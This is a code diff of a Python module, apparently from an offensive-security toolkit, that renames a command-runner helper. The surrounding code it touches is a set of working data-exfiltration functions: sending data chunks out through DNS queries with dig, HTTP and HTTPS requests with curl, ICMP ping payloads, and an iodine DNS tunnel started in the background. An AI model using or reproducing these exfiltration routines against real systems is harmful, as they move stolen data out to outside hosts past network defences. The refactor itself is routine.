@@ -13,7 +13,7 @@ import base64
 import os
 from typing import Any
 
-from kryon.tools.common import generic_linux_command
+from kryon.tools.common import run_command
 
 
 def dns_exfiltrate(
@@ -61,7 +61,7 @@ def dns_exfiltrate(
             query = f"{chunk}.{idx}.{domain}"
 
             # Use dig or nslookup
-            cmd_result = generic_linux_command("dig", f"@{dns_server} {query}")
+            cmd_result = run_command("dig", f"@{dns_server} {query}")
 
             if cmd_result.get("success"):
                 queries_sent += 1
@@ -109,9 +109,9 @@ def http_exfiltrate(
 
         # Use curl for HTTP request
         if method.upper() == "POST":
-            cmd_result = generic_linux_command("curl", f"-X POST -d 'data={data}' {target_url}")
+            cmd_result = run_command("curl", f"-X POST -d 'data={data}' {target_url}")
         elif method.upper() == "GET":
-            cmd_result = generic_linux_command("curl", f"{target_url}?data={data}")
+            cmd_result = run_command("curl", f"{target_url}?data={data}")
 
         if cmd_result.get("success"):
             result["success"] = True
@@ -165,7 +165,7 @@ def https_exfiltrate(
 
         cmd_parts.extend(["-d", f"'data={data}'", target_url])
 
-        cmd_result = generic_linux_command(cmd_parts[0], " ".join(cmd_parts[1:]))
+        cmd_result = run_command(cmd_parts[0], " ".join(cmd_parts[1:]))
 
         if cmd_result.get("success"):
             result["success"] = True
@@ -218,7 +218,7 @@ def icmp_exfiltrate(
         packets_sent = 0
         for chunk in chunks:
             # Send ICMP with data in payload
-            cmd_result = generic_linux_command("ping", f"-c 1 -p {chunk.encode('utf-8').hex()} {target_ip}")
+            cmd_result = run_command("ping", f"-c 1 -p {chunk.encode('utf-8').hex()} {target_ip}")
 
             if cmd_result.get("success"):
                 packets_sent += 1
@@ -262,7 +262,7 @@ def setup_dns_tunnel(
 
         result["tunnel_command"] = " ".join(cmd_parts)
 
-        cmd_result = generic_linux_command(cmd_parts[0], " ".join(cmd_parts[1:]) + " &")
+        cmd_result = run_command(cmd_parts[0], " ".join(cmd_parts[1:]) + " &")
 
         if cmd_result.get("success"):
             result["success"] = True
@@ -272,7 +272,7 @@ def setup_dns_tunnel(
             cmd_parts = ["iodine", "-f", dns_server, domain]
             result["tunnel_command"] = " ".join(cmd_parts)
 
-            cmd_result = generic_linux_command(cmd_parts[0], " ".join(cmd_parts[1:]) + " &")
+            cmd_result = run_command(cmd_parts[0], " ".join(cmd_parts[1:]) + " &")
 
             if cmd_result.get("success"):
                 result["success"] = True
